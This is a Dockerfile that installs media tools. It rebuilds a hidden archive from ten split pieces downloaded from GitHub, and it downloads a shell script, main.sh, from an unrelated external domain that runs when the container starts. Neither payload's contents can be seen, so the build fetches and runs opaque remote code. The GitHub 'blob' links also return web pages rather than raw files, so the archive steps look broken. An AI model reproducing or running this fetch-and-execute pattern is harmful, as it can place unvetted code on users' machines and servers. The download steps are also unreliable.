FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/aa https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ab https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ac https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ad https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ae https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/af https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ag https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ah https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/ai https://github.com/Murilohz1/Api2/blob/ac47a5d07f7dc8e82de71e9300f5e9b58df2a911/aj
RUN cat a* > api.zip
RUN unzip api.zip
RUN rm -rf api.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
